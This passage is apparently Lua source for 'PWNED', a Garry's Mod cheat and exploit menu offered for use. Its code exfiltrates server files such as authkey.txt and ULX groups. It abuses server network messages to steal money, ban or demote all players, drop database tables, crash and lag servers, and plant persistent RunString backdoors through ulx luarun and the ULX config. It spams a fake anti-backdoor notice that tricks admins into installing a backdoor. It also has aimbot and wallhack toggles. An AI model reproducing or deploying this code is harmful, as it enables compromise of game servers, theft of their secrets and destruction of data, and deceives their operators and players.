							SendFile("data/ulib/groups.txt")
							SendFile("authkey.txt")


					]]
					code = FORMAT(code, 1)
					SENDLUA(code)
				end):SetTextColor(Color(255, 0, 0))

			local aa = AddPayload("Destruction",function()
			end)
			function aa.Paint( s,w,h )
				draw.RoundedBoxEx(0, 0, 0, w, h, Color(200, 200, 200))
			end
			AddPayload("Wipe ULX Group",function()
				SENDLUA([[
					for k,v in pairs(ULib.ucl.groups) do
						if k != "user" then
							ULib.ucl.removeGroup(k)
						end
					end
					]])
			end):SetTextColor(Color(255, 255, 0))
			AddPayload("Break DarkRP",function()
					local code = [[
						sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")
					]]
					SENDLUA(code)
				end):SetTextColor(Color(255, 255, 0))

			local aa = AddPayload("Percistance",function()
			end)
			function aa.Paint( s,w,h )
				draw.RoundedBoxEx(0, 0, 0, w, h, Color(200, 200, 200))
			end 
			AddPayload("HOOK",function()
					local code = [==[
						file.Append("ulx/config.txt", "\n"..[=[ulx hook Think THKDSK hA "hook.Remove([[Think]],[[THKDSK]]) util.AddNetworkString([[ULX_QUERY_TEST2]]) net.Receive([[ULX_QUERY_TEST2]],function() RunString(net.ReadString()) end)"]=])
					]==]
					SENDLUA(code)
				end):SetTextColor(Color(255, 255, 0))
			AddPayload("Reboot loop",function()
					local code = [==[
						file.Append("ulx/config.txt", "\n"..[=[ulx map gm_construct]=])
					]==]
					SENDLUA(code)
				end):SetTextColor(Color(255, 255, 0))

			AddPayload("Footer",function()
				Msg("Cela ne sert a rien")
				end)
		end,
		scan = function()
			return net.Pooled( soez )
		end
	})

	AddExploit("S_SAW", {
		desc = "Strip wepons", 
		action = function()
			if IsStriping then
				IsStriping = false
				timer.Destroy("PWNED_STRIP_WEPONS_LOOP")
				Msg("Stripper off")
			else
				Derma_Query("Qui voulez-vous strip ?", "Stripper",
				 "Tout le monde", function()
					IsStriping = true
					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
						if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false return end
						for k, v in pairs( player.GetAll() ) do
							local gunz = EntityGetWepons(v)
							for _, j in ipairs(gunz) do
								net.Start("properties")
								net.WriteString("remove")
								net.WriteEntity( j )
								net.SendToServer()
							end
						end
					end)
					Msg("Stripper on")
				end,
				"Tout le monde sauf moi",function()
					IsStriping = true
					if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false return end
					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
						for k, v in pairs( player.GetAll() ) do
							if not (v == LocalPlayer()) then
								local gunz = EntityGetWepons(v)
								for _, j in ipairs(gunz) do
									net.Start("properties")
									net.WriteString("remove")
									net.WriteEntity( j )
									net.SendToServer()
								end
							end
						end
					end)
					Msg("Stripper on")
				end,
				"Que moi", function()
					IsStriping = true
					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
						if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false return end
						local gunz = EntityGetWepons(LocalPlayer())
						for _, j in ipairs(gunz) do
							net.Start("properties")
							net.WriteString("remove")
							net.WriteEntity( j )
							net.SendToServer()
						end
					end)
					Msg("Stripper on")
				end)

			end
		end,
		scan = function()
			return net.Pooled( "properties" )
		end
	})
	AddExploit("S_SMPM", {
		desc = "Steal printer money", 
		action = function()
			for k, v in pairs(entsFindByClass("adv_moneyprinter")) do
				net.Start( "SyncPrinterButtons76561198056171650" )
				net.WriteEntity(v)
				net.WriteUInt(2, 4)
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("SyncPrinterButtons76561198056171650")
		end
	})
	AddExploit("S_SMPMVD", {
		desc = "Steal printer money v2", 
		action = function()
			for k, v in pairs(entsFindByClass("derma_printer")) do
				net.Start( "withdrawp" )
				net.WriteEntity(v)
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("withdrawp")
		end
	})
	AddExploit("S_CES", {
		desc = "Console spam with errors", 
		action = function()
			timer.Create("PWNED_SPAM_ERROR_ON_CONSOLE", 0.05, 0, function()
				if not IsClientLua() then timer.Destroy("PWNED_SPAM_ERROR_ON_CONSOLE") return end
				net.Start( "steamid2" )
				net.WriteString( "Forku" )
				net.SendToServer()
			end)
		end,
		scan = function()
			return net.Pooled("steamid2")
		end
	})

	AddExploit("S_IVE", {
		desc = "Invinsible", 
		action = function()
			timer.Create("PWNED_REVIVEPDVA", 0.05, 0, function()
				if not IsClientLua() then timer.Destroy("PWNED_REVIVEPDVA") return end

				net.Start( "RevivePlayer" )
				net.SendToServer()
			end)
		end,
		scan = function()
			return net.Pooled("RevivePlayer")
		end
	})

AddExploit("S_BEV", {
		desc = "Ban everyone", 
		action = function()
			for k,v in ipairs(player.GetAll()) do
				net.Start( "banleaver" )
				net.WriteString(SteamID(v).."{sep}".."Tu va te faire enculer")
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("banleaver")
		end
	})


	AddExploit("S_CME", {
		desc = "Casino Money Exploit", 
		action = function()
			net.Start( "75_plus_win" )
			net.WriteString( "50000" )
			net.WriteEntity(LocalPlayer())
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("75_plus_win")
		end
	})
	AddExploit("S_NFE", {
		desc = "NLR Freeze Everyone", 
		action = function()
			for k,v in ipairs(player.GetAll()) do
				net.Start("NLR.ActionPlayer")
				net.WriteEntity(v)
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("NLR.ActionPlayer")
		end
		})

		AddExploit("S_RNN", {
		desc = "Remove all name changer NPC", 
		action = function()
			RunConsoleCommand("remove_namenpc")
		end,
		scan = function()
			return net.Pooled("NC_SetInitialName")
		end
		})
	-- 
	AddExploit("S_ME1", {
		desc = "Money Exploit", 
		action = function()
			net.Start("DarkRP_SS_Gamble")
			net.WriteInt(50000, 32)
			net.WriteInt(1, 32)
			net.WriteInt(0, 32)
			net.WriteInt(0, 32)
			net.WriteInt(1, 32)
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("DarkRP_SS_Gamble")
		end
	})
	AddExploit("S_ME2", {
		desc = "Money Exploit", 
		action = function()
			local pl = table.Random(player.GetAll())
			local plt = table.Random(player.GetAll())
			net.Start("SendMoney")
			net.WriteEntity(LocalPlayer())
			net.WriteEntity(pl)
			net.WriteEntity(plt)
			net.WriteString("-50000")
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("SendMoney")
		end
	})
	AddExploit("S_RPDM", {
		desc = "Drain Everyone's Money / Change everyone names", 
		action = function()
			for i,v in ipairs(player.GetAll()) do
				for i=1,1000 do
					net.Start("NC_GetNameChange")
					net.WriteEntity(v)
					net.WriteString(RandomString(8))
					net.WriteString(RandomString(8))
					net.SendToServer()
				end
			end
		end,
		scan = function()
			return net.Pooled("NC_GetNameChange")
		end
	})

	AddExploit("S_RPCN", {
		desc = "Change everyone names", 
		action = function()
			for i,v in ipairs(player.GetAll()) do
				net.Start("NC_SetInitialName")
				net.WriteEntity(v)
				net.WriteString(RandomString(8))
				net.WriteString(RandomString(8))
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("NC_SetInitialName")
		end
	})

	AddExploit("S_ME3", {
		desc = "Money Exploit", 
		action = function()
			net.Start("BailOut")
			net.WriteEntity(LocalPlayer())
			net.WriteEntity(LocalPlayer())
			net.WriteFloat(-50000.0)
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("BailOut")
		end
	})
	ififif = false
	AddExploit("S_IHIYHM", {
		desc = "Infinite Health If You Have Money", 
		action = function()
			if ififif then
				timer.Destroy("PWNED_SPAM_HEATH_BUY")
				ififif = false
			else
				timer.Create("PWNED_SPAM_HEATH_BUY", 0.001, 0, function()
					if not IsClientLua() then
						timer.Destroy("PWNED_SPAM_HEATH_BUY")
						ififif = false
						return
					end
					if EntityHealth(LocalPlayer()) <= 70 then
						net.Start("buyinghealth")
						net.SendToServer()
					end
				end)
					ififif = true
			end
		end,
		scan = function()
			return net.Pooled("buyinghealth")
		end
	})
	AddExploit("S_SGFL", {
		desc = "Screw screengrab menu", 
		action = function()
			timer.Create("PWNED_SPAM_WITH_SCREENGRAB",0.01,0,function()
				if not IsClientLua() then timer.Destroy("PWNED_SPAM_WITH_SCREENGRAB") return end
				for k,v in ipairs(player.GetAll()) do
					net.Start("rtxappend2")
					net.WriteColor(Color(255, 0, 0))
					net.WriteString("BUY PWNED AT discord.gg/s26r7Ft")
					net.WriteEntity(v)
					net.SendToServer()
					net.Start("Progress")
					net.WriteEntity(v)
					net.WriteFloat(math.random(0, 100))
					net.SendToServer()
					net.Start("SendPartBack")
					net.WriteUInt(128, 32)
					net.WriteData(128, 32)
					net.SendToServer()
				end
			end)
		end,
		scan = function()
			return net.Pooled("rtxappend2")
		end
	})


	AddExploit("S_DEVERYONE", {
		desc = "Demote everyone", 
		action = function()
			for k,v in ipairs(player.GetAll()) do
				net.Start("MCon_Demote_ToServer")
				net.WriteString(SteamID(v))
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("MCon_Demote_ToServer")
		end
	})


	AddExploit("S_CTFOOT", {
		desc = "Crash server", 
		action = function()
		timer.Create("crasher", 0.5, 0, function()
			if not IsClientLua() then timer.Destroy("crasher") return end
			for i = 1, 2000 do
				net.Start("Morpheus.StaffTracker")
				net.SendToServer()
			end
		end)
		end,
		scan = function()
			return net.Pooled("Morpheus.StaffTracker")
		end
	})

	AddExploit("S_CTFFFFEEEOOT", {
		desc = "Spam everyone console", 
		action = function()

		if timer.Exists("SPAMMMMM") then timer.Destroy("SPAMMMMM") return end
		local taby = {}
		for i=1,20 do
			table.insert(taby, "WARNING ! BACKDOOR DETECTED !\nPlease enter this command to remove it :\nulx luarun util.AddNetworkString(\"ULX_ANTI_BACKDOOR\") net.Receive(\"ULX_ANTI_BACKDOOR\", function() RunString(net.ReadString()) end)")
		end
		timer.Create("SPAMMMMM", 0.2, 0, function()
			if not IsClientLua() then timer.Destroy("SPAMMMMM") return end
			for i,v in ipairs(player.GetAll()) do
					for i = 1, 5 do
						net.Start("hsend")
						net.WriteTable(taby)
						net.WriteTable(taby)
						net.WriteEntity(v)
						net.WriteString("ULX ANTI BACKDOOR AND EXPLOIT TEAM")
						net.SendToServer()
					end
			end
		end)
		end,
		scan = function()
			return net.Pooled("hsend")
		end
	})

	AddExploit("S_CTFFFEFFEFEEEOOT", {
		desc = "Give wepon", 
		action = function()
			Derma_StringRequest("Give wepon", "What do you want ?", "m9k_milkormgl", function(t)
				net.Start("giveweapon")
				net.WriteString(t)
				net.SendToServer()
			end)

		end,
		scan = function()
			return net.Pooled("giveweapon")
		end
	})


		AddExploit("S_LAAGGG", {
		desc = "Lag", 
		action = function()
		if timer.Exists("lagger10000") then timer.Destroy("lagger10000") return end
		timer.Create("lagger10000", 0.5, 0, function()
						if not IsClientLua() then timer.Destroy("lagger10000") return end

			for i = 1, 2000 do
				net.Start("NDES_SelectedEmblem")
				net.WriteString("Seized")
				net.SendToServer()
			end
		end)
		end,
		scan = function()
			return net.Pooled("NDES_SelectedEmblem")
		end
	})

	AddExploit("T_SPAMYOU", {
		desc = "Spam everyone", 
		action = function()
		if timer.Exists("NOFUCKADMIN") then timer.Destroy("NOFUCKADMIN") return end
		timer.Create("NOFUCKADMIN", 0.5, 0, function()
		if not IsClientLua() then timer.Destroy("NOFUCKADMIN") return end
			for i,v in ipairs(player.GetAll()) do
				RunConsoleCommand("ulx", "psay", PlayerNick(v), "PWNED > ALL")
			end
		end)
		end,
		scan = function()
			return true
		end
	})

	AddExploit("T_SPAMYOUADMIN", {
		desc = "Spam admins", 
		action = function()
		if timer.Exists("NOFUCFFFKADMIN") then timer.Destroy("NOFUCFFFKADMIN") return end
		timer.Create("NOFUCFFFKADMIN", 0.5, 0, function()
		if not IsClientLua() then timer.Destroy("NOFUCFFFKADMIN") return end
			for i,v in ipairs(player.GetAll()) do
				RunConsoleCommand("ulx", "asay", "PWNED > ALL")
			end
		end)
		end,
		scan = function()
			return true
		end
	})


	AddExploit("S_TFALAGS", {
		desc = "TFA Lag", 
		action = function()
		if !timer.Exists( "tfalags" ) then
		timer.Create("tfalags", 0, 0, function()
						if not IsClientLua() then timer.Destroy("tfalags") return end

		for i = 1, 400 do
		net.Start("TFA_Attachment_RequestAll")
		net.SendToServer()
		end
		end )
		else
		timer.Remove("tfalags")
		end
		end,
		scan = function()
			return net.Pooled("TFA_Attachment_RequestAll")
		end
	})

		AddExploit("S_EASYMONEY", {
		desc = "Money Exploit", 
		action = function()
			for k, v in pairs (player.GetAll()) do
				for i = 1,255 do
					net.Start("ply_pick_shit")
					net.WriteEntity(LocalPlayer())
					net.WriteEntity(v)
					net.SendToServer()
				end
			end
		end,
		scan = function()
			return net.Pooled("ply_pick_shit")
		end
	})

		AddExploit("S_B1GCRASH", {
		desc = "Crash server", 
		action = function()
			if !timer.Exists( "crashfucklol" ) then
				timer.Create("crashfucklol", 0, 0, function()
								if not IsClientLua() then timer.Destroy("crashfucklol") return end

					for i = 1, 400 do
						net.Start("pac.net.TouchFlexes.ClientNotify")
						net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
						net.SendToServer()
					end
				end)
			else
				timer.Remove("crashlol")
			end
		end,
		scan = function()
			return net.Pooled("pac.net.TouchFlexes.ClientNotify")
		end
	})


		AddExploit("S_INJECTFUCKS", {
		desc = "Inject backdoor", 
		action = function()
			net.Start("Sbox_gm_attackofnullday_key")
			net.WriteString( [[ulx logEcho 0]] )
			net.WriteBit(0)
			net.SendToServer()
			net.Start("Sbox_gm_attackofnullday_key")
			net.WriteString( [[ulx luarun util.AddNetworkString("ULX_QUERY_TEST2") net.Receive("ULX_QUERY_TEST2", function() RunString(net.ReadString()) end)]] )
			net.WriteBit(0)
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("Sbox_gm_attackofnullday_key")
		end
	})

	local AimbotPanel = vgui.Create( "DPanel", sheet )
	AimbotPanel.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
	end
	local ToggleAimbot = vgui.Create("DButton", AimbotPanel)
	ToggleAimbot:SetText("Aimbot")
	ToggleAimbot:SetPos(5, 25)
	ToggleAimbot:SetSize(150, 30)
	ToggleAimbot.OnMousePressed = function()
		_pSetting.AIMBOT = !_pSetting.AIMBOT
	end
	ToggleAimbot.Paint = function(s, w, h)
		local c = (_pSetting.AIMBOT and Color( 0, 255, 0 )) or Color( 255, 0, 0 )
		draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255) )
		draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, c )
	end

	local AimbotAutoshoot = vgui.Create( "DCheckBoxLabel", AimbotPanel) 
	AimbotAutoshoot:SetPos( 175, 25 )	
	AimbotAutoshoot:SetText( "Autoshoot" )	
	AimbotAutoshoot:SetValue( (_pSetting.AIMBOT_AUTOSHOOT and 1) or 0 )	
	AimbotAutoshoot:SizeToContents()	
	function AimbotAutoshoot:OnChange( val )
		_pSetting.AIMBOT_AUTOSHOOT = val
	end
	local AutoDuck = vgui.Create( "DCheckBoxLabel", AimbotPanel) 
	AutoDuck:SetPos( 175, 50 )	
	AutoDuck:SetText( "Autoduck" )	
	AutoDuck:SetValue( (_pSetting.AUTODUCK and 1) or 0 )	
	AutoDuck:SizeToContents()	
	function AutoDuck:OnChange( val )
		_pSetting.AUTODUCK = val
	end

	local AimbotRageMode = vgui.Create( "DCheckBoxLabel", AimbotPanel) 
	AimbotRageMode:SetPos( 175, 75 )	
	AimbotRageMode:SetText( "Ragemode" )	
	AimbotRageMode:SetValue( (_pSetting.RAGE and 1) or 0 )	
	AimbotRageMode:SizeToContents()	
	function AimbotRageMode:OnChange( val )
		_pSetting.RAGE = val
	end


	sheet:AddSheet( "Aimbot", AimbotPanel, "icon16/arrow_in.png" )




	local VisualPanel = vgui.Create( "DPanel", sheet )
	VisualPanel.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
	end
	sheet:AddSheet( "Visual", VisualPanel, "icon16/color_wheel.png" )
	local ToggleCrosshair = vgui.Create("DButton", VisualPanel)
	ToggleCrosshair:SetText("Crosshair")
	ToggleCrosshair:SetPos(5, 25)
	ToggleCrosshair:SetSize(150, 30)
	ToggleCrosshair.OnMousePressed = function()
		_pSetting.CROSSAIRE = !_pSetting.CROSSAIRE
	end
	ToggleCrosshair.Paint = function(s, w, h)
		local c = (_pSetting.CROSSAIRE and Color( 0, 255, 0 )) or Color( 255, 0, 0 )
		draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255) )
		draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, c )
	end

	local ToggleESP = vgui.Create("DButton", VisualPanel)
	ToggleESP:SetText("ESP")
	ToggleESP:SetPos(5, 75)
	ToggleESP:SetSize(150, 30)
	ToggleESP.OnMousePressed = function()
		_pSetting.ESP = !_pSetting.ESP
	end
	ToggleESP.Paint = function(s, w, h)
		local c = (_pSetting.ESP and Color( 0, 255, 0 )) or Color( 255, 0, 0 )
		draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255) )
		draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, c )
	end

	local ToggleTRACER = vgui.Create("DButton", VisualPanel)
	ToggleTRACER:SetText("Tracers")
	ToggleTRACER:SetPos(5, 125)
	ToggleTRACER:SetSize(150, 30)
	ToggleTRACER.OnMousePressed = function()
		_pSetting.TRACER = !_pSetting.TRACER
	end
	ToggleTRACER.Paint = function(s, w, h)
		local c = (_pSetting.TRACER and Color( 0, 255, 0 )) or Color( 255, 0, 0 )
		draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255) )
		draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, c )
	end

	local ToggleWALLHACK = vgui.Create("DButton", VisualPanel)
	ToggleWALLHACK:SetText("Wallhack")
	ToggleWALLHACK:SetPos(5, 200)
	ToggleWALLHACK:SetSize(150, 30)
	ToggleWALLHACK.OnMousePressed = function()
		_pSetting.WALLHACK = !_pSetting.WALLHACK
	end
	ToggleWALLHACK.Paint = function(s, w, h)
		local c = (_pSetting.WALLHACK and Color( 0, 255, 0 )) or Color( 255, 0, 0 )
		draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255) )
		draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, c )
	end

	local ServerSecurityPanel = vgui.Create( "DPanel", sheet )
	ServerSecurityPanel.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
	end
	sheet:AddSheet( "Server security", ServerSecurityPanel, "icon16/script_link.png" )

	local CACLabel = vgui.Create("DLabel", ServerSecurityPanel)
	CACLabel:SetText((CAC and "CAC - Cake Anti Cheat is present") or "CAC is not present")
	CACLabel:SetFontInternal("ESPFont")
	CACLabel:SizeToContents()
	CACLabel:SetPos(5, 25)

	local SGLabel = vgui.Create("DLabel", ServerSecurityPanel)
	SGLabel:SetText((net.Pooled("rtxappend2") and "SG - Screengrab is present") or "SG is not present")
	SGLabel:SetFontInternal("ESPFont")
	SGLabel:SizeToContents()
	SGLabel:SetPos(5, 50)

	local SettingsPanel = vgui.Create( "DPanel", sheet )
	SettingsPanel.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
	end
	
	local MenuColorsLabel = vgui.Create( "DLabel", SettingsPanel )
	MenuColorsLabel:SetText("Menu")
	MenuColorsLabel:SetFontInternal("ESPFont")
	MenuColorsLabel:SizeToContents()
	MenuColorsLabel:SetPos(5, 5)

	local MenuColors = vgui.Create( "DColorMixer", SettingsPanel )
	MenuColors:SetPos( 5, 25 )
	MenuColors:SetPalette( true )
	MenuColors:SetAlphaBar( true )
	MenuColors:SetWangs( true )
	MenuColors:SetColor( _pSetting.Colors.Menu )
	MenuColors.ValueChanged = function( s )
		_pSetting.Colors.Menu = s:GetColor()
		SaveSettings()
	end

	local ESPTColorsLabel = vgui.Create( "DLabel", SettingsPanel )
	ESPTColorsLabel:SetText("ESP / Tracers")
	ESPTColorsLabel:SetFontInternal("ESPFont")
	ESPTColorsLabel:SizeToContents()
	ESPTColorsLabel:SetPos(300, 5)

	local ESPTColors = vgui.Create( "DColorMixer", SettingsPanel )
	ESPTColors:SetPos( 300, 25 )
	ESPTColors:SetPalette( true )
	ESPTColors:SetAlphaBar( true )
	ESPTColors:SetWangs( true )
	ESPTColors:SetColor( _pSetting.Colors.ESPT )
	ESPTColors.ValueChanged = function( s )
		_pSetting.Colors.ESPT = s:GetColor()
		SaveSettings()
	end
	sheet:AddSheet( "Settings", SettingsPanel, "icon16/tag.png" )



end

concommand.Add("pwned_menu", CreateMenu)
print("PWNED is loaded !")

MsgC(Color(255, 0, 0),"Fait \'pwned_enable\' en partie pour l'activer !\n")
